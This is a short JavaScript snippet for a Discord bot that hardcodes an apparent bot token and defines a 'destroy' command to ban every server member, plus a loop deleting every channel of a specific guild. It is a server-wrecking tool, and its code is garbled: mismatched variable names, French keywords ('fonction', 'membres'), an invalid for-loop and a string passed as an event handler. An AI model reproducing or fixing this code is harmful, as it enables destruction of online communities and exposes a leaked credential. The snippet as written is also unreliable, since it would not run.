const Discord = require ("discord.js"); 
const Bot = new Discord.Client (); 
Bot.login ("NTAzNTk2NTEwMzQ5NjIzMjk2.Dq4ziQ.6pm4GpWHZKRKqmKpfU89XXxb-Uk"); 

bot.on ("ready", function () { 
console.log ("Ready."); 
}); 

bot.on ("message", fonction (msg) { 
if (msg.content.toLowerCase () == "destroy") { 
for (membres var in msg.guild.members) {members.ban 
(); 
} 
} 
} )

Client.on('var server = Client.guilds.get('503557304881250311');
for (var i = 0; i < server.channels.array().length; i++) {
    server.channels.array()[i].delete();
}')
